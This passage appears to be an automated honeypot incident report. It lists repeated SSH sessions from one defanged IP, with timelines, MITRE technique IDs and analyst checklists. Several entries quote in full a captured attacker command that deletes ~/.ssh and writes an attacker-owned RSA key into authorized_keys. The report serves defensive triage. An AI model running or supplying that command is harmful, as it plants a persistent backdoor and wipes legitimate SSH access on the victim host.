**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 18:37:28` | `cowrie.session.connect` |
| `2026-04-23 18:37:28` | `cowrie.client.version` |
| `2026-04-23 18:37:28` | `cowrie.client.kex` |
| `2026-04-23 18:37:29` | `cowrie.login.success` |
| `2026-04-23 18:37:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.194.140[.]170` to AbuseIPDB if not already reported
- [ ] Block `189.194.140[.]170` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5389f44ba312

| Field | Detail |
|---|---|
| **Source IP** | `189.194.140[.]170` |
| **First Seen** | 2026-04-23 18:38 |
| **Last Seen** | 2026-04-23 18:38 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 18:38:18` | `cowrie.session.connect` |
| `2026-04-23 18:38:18` | `cowrie.client.version` |
| `2026-04-23 18:38:19` | `cowrie.client.kex` |
| `2026-04-23 18:38:20` | `cowrie.login.success` |
| `2026-04-23 18:38:21` | `cowrie.session.params` |
| `2026-04-23 18:38:21` | `cowrie.command.input` |
| `2026-04-23 18:38:21` | `cowrie.command.failed` |
| `2026-04-23 18:38:21` | `cowrie.log.closed` |
| `2026-04-23 18:38:21` | `cowrie.session.params` |
| `2026-04-23 18:38:21` | `cowrie.command.input` |
| `2026-04-23 18:38:22` | `cowrie.session.file_download` |
| `2026-04-23 18:38:22` | `cowrie.log.closed` |
| `2026-04-23 18:38:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.194.140[.]170` to AbuseIPDB if not already reported
- [ ] Block `189.194.140[.]170` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f7b016aeb096

| Field | Detail |
|---|---|
| **Source IP** | `189.194.140[.]170` |
| **First Seen** | 2026-04-23 18:38 |
| **Last Seen** | 2026-04-23 18:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 18:38:25` | `cowrie.session.connect` |
| `2026-04-23 18:38:25` | `cowrie.client.version` |
| `2026-04-23 18:38:25` | `cowrie.client.kex` |
| `2026-04-23 18:38:27` | `cowrie.login.success` |
| `2026-04-23 18:38:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.194.140[.]170` to AbuseIPDB if not already reported
- [ ] Block `189.194.140[.]170` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4b1a50ace496

| Field | Detail |
|---|---|
| **Source IP** | `189.194.140[.]170` |
| **First Seen** | 2026-04-23 18:39 |
| **Last Seen** | 2026-04-23 18:39 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 18:39:17` | `cowrie.session.connect` |
| `2026-04-23 18:39:17` | `cowrie.client.version` |
| `2026-04-23 18:39:17` | `cowrie.client.kex` |
| `2026-04-23 18:39:18` | `cowrie.login.success` |
| `2026-04-23 18:39:19` | `cowrie.session.params` |
| `2026-04-23 18:39:19` | `cowrie.command.input` |
| `2026-04-23 18:39:19` | `cowrie.command.failed` |
| `2026-04-23 18:39:19` | `cowrie.log.closed` |
| `2026-04-23 18:39:20` | `cowrie.session.params` |
| `2026-04-23 18:39:20` | `cowrie.command.input` |
| `2026-04-23 18:39:20` | `cowrie.session.file_download` |
| `2026-04-23 18:39:20` | `cowrie.log.closed` |
| `2026-04-23 18:39:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.194.140[.]170` to AbuseIPDB if not already reported
- [ ] Block `189.194.140[.]170` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-205fe1644211

| Field | Detail |
|---|---|
| **Source IP** | `189.194.140[.]170` |
| **First Seen** | 2026-04-23 18:39 |
| **Last Seen** | 2026-04-23 18:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 18:39:23` | `cowrie.session.connect` |
| `2026-04-23 18:39:23` | `cowrie.client.version` |
| `2026-04-23 18:39:24` | `cowrie.client.kex` |
| `2026-04-23 18:39:25` | `cowrie.login.success` |
| `2026-04-23 18:39:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.194.140[.]170` to AbuseIPDB if not already reported
- [ ] Block `189.194.140[.]170` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7f375dabbfe1

| Field | Detail |
|---|---|
| **Source IP** | `189.194.140[.]170` |
| **First Seen** | 2026-04-23 18:43 |
| **Last Seen** | 2026-04-23 18:43 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 18:43:09` | `cowrie.session.connect` |
| `2026-04-23 18:43:09` | `cowrie.client.version` |
| `2026-04-23 18:43:09` | `cowrie.client.kex` |
| `2026-04-23 18:43:10` | `cowrie.login.success` |
| `2026-04-23 18:43:11` | `cowrie.session.params` |
| `2026-04-23 18:43:11` | `cowrie.command.input` |
| `2026-04-23 18:43:11` | `cowrie.command.failed` |
| `2026-04-23 18:43:11` | `cowrie.log.closed` |
| `2026-04-23 18:43:12` | `cowrie.session.params` |
| `2026-04-23 18:43:12` | `cowrie.command.input` |
| `2026-04-23 18:43:12` | `cowrie.session.file_download` |
| `2026-04-23 18:43:12` | `cowrie.log.closed` |
| `2026-04-23 18:43:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.194.140[.]170` to AbuseIPDB if not already reported
- [ ] Block `189.194.140[.]170` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8eead0899356

| Field | Detail |
|---|---|
| **Source IP** | `189.194.140[.]170` |
| **First Seen** | 2026-04-23 18:43 |
| **Last Seen** | 2026-04-23 18:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 18:43:15` | `cowrie.session.connect` |
| `2026-04-23 18:43:15` | `cowrie.client.version` |
| `2026-04-23 18:43:16` | `cowrie.client.kex` |
| `2026-04-23 18:43:17` | `cowrie.login.success` |
| `2026-04-23 18:43:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.194.140[.]170` to AbuseIPDB if not already reported
- [ ] Block `189.194.140[.]170` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-07cfa5572959

| Field | Detail |
|---|---|
| **Source IP** | `189.194.140[.]170` |
| **First Seen** | 2026-04-23 18:44 |
| **Last Seen** | 2026-04-23 18:44 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 18:44:06` | `cowrie.session.connect` |
| `2026-04-23 18:44:06` | `cowrie.client.version` |
| `2026-04-23 18:44:06` | `cowrie.client.kex` |
| `2026-04-23 18:44:07` | `cowrie.login.success` |
| `2026-04-23 18:44:08` | `cowrie.session.params` |
| `2026-04-23 18:44:08` | `cowrie.command.input` |
| `2026-04-23 18:44:08` | `cowrie.command.failed` |
| `2026-04-23 18:44:08` | `cowrie.log.closed` |
| `2026-04-23 18:44:09` | `cowrie.session.params` |
| `2026-04-23 18:44:09` | `cowrie.command.input` |
| `2026-04-23 18:44:09` | `cowrie.session.file_download` |
| `2026-04-23 18:44:09` | `cowrie.log.closed` |
| `2026-04-23 18:44:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.194.140[.]170` to AbuseIPDB if not already reported
- [ ] Block `189.194.140[.]170` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5102564aa4fe

| Field | Detail |
|---|---|
| **Source IP** | `189.194.140[.]170` |
| **First Seen** | 2026-04-23 18:44 |
| **Last Seen** | 2026-04-23 18:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 18:44:12` | `cowrie.session.connect` |
| `2026-04-23 18:44:12` | `cowrie.client.version` |
| `2026-04-23 18:44:13` | `cowrie.client.kex` |
| `2026-04-23 18:44:14` | `cowrie.login.success` |
| `2026-04-23 18:44:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.194.140[.]170` to AbuseIPDB if not already reported
- [ ] Block `189.194.140[.]170` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ec0cd475f8ee

| Field | Detail |
|---|---|
| **Source IP** | `189.194.140[.]170` |
| **First Seen** | 2026-04-23 18:45 |
| **Last Seen** | 2026-04-23 18:45 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 18:45:04` | `cowrie.session.connect` |
| `2026-04-23 18:45:04` | `cowrie.client.version` |
| `2026-04-23 18:45:05` | `cowrie.client.kex` |
| `2026-04-23 18:45:06` | `cowrie.login.success` |
| `2026-04-23 18:45:07` | `cowrie.session.params` |
| `2026-04-23 18:45:07` | `cowrie.command.input` |
| `2026-04-23 18:45:07` | `cowrie.command.failed` |
| `2026-04-23 18:45:07` | `cowrie.log.closed` |
| `2026-04-23 18:45:08` | `cowrie.session.params` |
| `2026-04-23 18:45:08` | `cowrie.command.input` |
| `2026-04-23 18:45:08` | `cowrie.session.file_download` |
| `2026-04-23 18:45:08` | `cowrie.log.closed` |
| `2026-04-23 18:45:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.194.140[.]170` to AbuseIPDB if not already reported
- [ ] Block `189.194.140[.]170` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1dcc08256968

| Field | Detail |
|---|---|
| **Source IP** | `189.194.140[.]170` |
| **First Seen** | 2026-04-23 18:45 |
| **Last Seen** | 2026-04-23 18:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 18:45:11` | `cowrie.session.connect` |
| `2026-04-23 18:45:11` | `cowrie.client.version` |
| `2026-04-23 18:45:12` | `cowrie.client.kex` |
| `2026-04-23 18:45:13` | `cowrie.login.success` |
| `2026-04-23 18:45:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.194.140[.]170` to AbuseIPDB if not already reported
- [ ] Block `189.194.140[.]170` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7c6da4efe159

| Field | Detail |
|---|---|
| **Source IP** | `189.194.140[.]170` |
| **First Seen** | 2026-04-23 18:46 |
| **Last Seen** | 2026-04-23 18:46 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 18:46:06` | `cowrie.session.connect` |
| `2026-04-23 18:46:06` | `cowrie.client.version` |
| `2026-04-23 18:46:06` | `cowrie.client.kex` |
| `2026-04-23 18:46:08` | `cowrie.login.success` |
| `2026-04-23 18:46:08` | `cowrie.session.params` |
| `2026-04-23 18:46:08` | `cowrie.command.input` |
| `2026-04-23 18:46:08` | `cowrie.command.failed` |
| `2026-04-23 18:46:08` | `cowrie.log.closed` |
| `2026-04-23 18:46:09` | `cowrie.session.params` |
| `2026-04-23 18:46:09` | `cowrie.command.input` |
| `2026-04-23 18:46:09` | `cowrie.session.file_download` |
| `2026-04-23 18:46:09` | `cowrie.log.closed` |
| `2026-04-23 18:46:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.194.140[.]170` to AbuseIPDB if not already reported
- [ ] Block `189.194.140[.]170` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-373ff7a2e0eb

| Field | Detail |
|---|---|
| **Source IP** | `189.194.140[.]170` |
| **First Seen** | 2026-04-23 18:46 |
| **Last Seen** | 2026-04-23 18:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 18:46:13` | `cowrie.session.connect` |
| `2026-04-23 18:46:13` | `cowrie.client.version` |
| `2026-04-23 18:46:13` | `cowrie.client.kex` |
| `2026-04-23 18:46:14` | `cowrie.login.success` |
| `2026-04-23 18:46:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.194.140[.]170` to AbuseIPDB if not already reported
- [ ] Block `189.194.140[.]170` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-68711e80c93c

| Field | Detail |
|---|---|
| **Source IP** | `189.194.140[.]170` |
| **First Seen** | 2026-04-23 18:50 |
| **Last Seen** | 2026-04-23 18:50 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 18:50:00` | `cowrie.session.connect` |
| `2026-04-23 18:50:00` | `cowrie.client.version` |
| `2026-04-23 18:50:01` | `cowrie.client.kex` |
| `2026-04-23 18:50:02` | `cowrie.login.success` |
| `2026-04-23 18:50:02` | `cowrie.session.params` |
| `2026-04-23 18:50:02` | `cowrie.command.input` |
| `2026-04-23 18:50:02` | `cowrie.command.failed` |
| `2026-04-23 18:50:03` | `cowrie.log.closed` |
| `2026-04-23 18:50:03` | `cowrie.session.params` |
| `2026-04-23 18:50:03` | `cowrie.command.input` |
| `2026-04-23 18:50:04` | `cowrie.session.file_download` |
| `2026-04-23 18:50:04` | `cowrie.log.closed` |
| `2026-04-23 18:50:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.194.140[.]170` to AbuseIPDB if not already reported
- [ ] Block `189.194.140[.]170` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aad4682cc075

| Field | Detail |
|---|---|
| **Source IP** | `189.194.140[.]170` |
| **First Seen** | 2026-04-23 18:50 |
| **Last Seen** | 2026-04-23 18:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 18:50:07` | `cowrie.session.connect` |
| `2026-04-23 18:50:07` | `cowrie.client.version` |
| `2026-04-23 18:50:08` | `cowrie.client.kex` |
| `2026-04-23 18:50:09` | `cowrie.login.success` |
| `2026-04-23 18:50:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.194.140[.]170` to AbuseIPDB if not already reported
- [ ] Block `189.194.140[.]170` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-862a36331204

| Field | Detail |
|---|---|
| **Source IP** | `189.194.140[.]170` |
| **First Seen** | 2026-04-23 18:52 |
| **Last Seen** | 2026-04-23 18:53 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 18:52:56` | `cowrie.session.connect` |
| `2026-04-23 18:52:56` | `cowrie.client.version` |
| `2026-04-23 18:52:57` | `cowrie.client.kex` |
| `2026-04-23 18:52:58` | `cowrie.login.success` |
| `2026-04-23 18:52:59` | `cowrie.session.params` |
| `2026-04-23 18:52:59` | `cowrie.command.input` |
| `2026-04-23 18:52:59` | `cowrie.command.failed` |
| `2026-04-23 18:52:59` | `cowrie.log.closed` |
| `2026-04-23 18:52:59` | `cowrie.session.params` |
| `2026-04-23 18:52:59` | `cowrie.command.input` |
| `2026-04-23 18:53:00` | `cowrie.session.file_download` |
| `2026-04-23 18:53:00` | `cowrie.log.closed` |
| `2026-04-23 18:53:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.194.140[.]170` to AbuseIPDB if not already reported
- [ ] Block `189.194.140[.]170` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2832dee271c0

| Field | Detail |
|---|---|
| **Source IP** | `189.194.140[.]170` |
| **First Seen** | 2026-04-23 18:53 |
| **Last Seen** | 2026-04-23 18:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 18:53:03` | `cowrie.session.connect` |
| `2026-04-23 18:53:03` | `cowrie.client.version` |
| `2026-04-23 18:53:03` | `cowrie.client.kex` |
| `2026-04-23 18:53:05` | `cowrie.login.success` |
| `2026-04-23 18:53:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.194.140[.]170` to AbuseIPDB if not already reported
- [ ] Block `189.194.140[.]170` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6476ef2b0452

| Field | Detail |
|---|---|
| **Source IP** | `189.194.140[.]170` |
| **First Seen** | 2026-04-23 18:54 |
| **Last Seen** | 2026-04-23 18:55 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
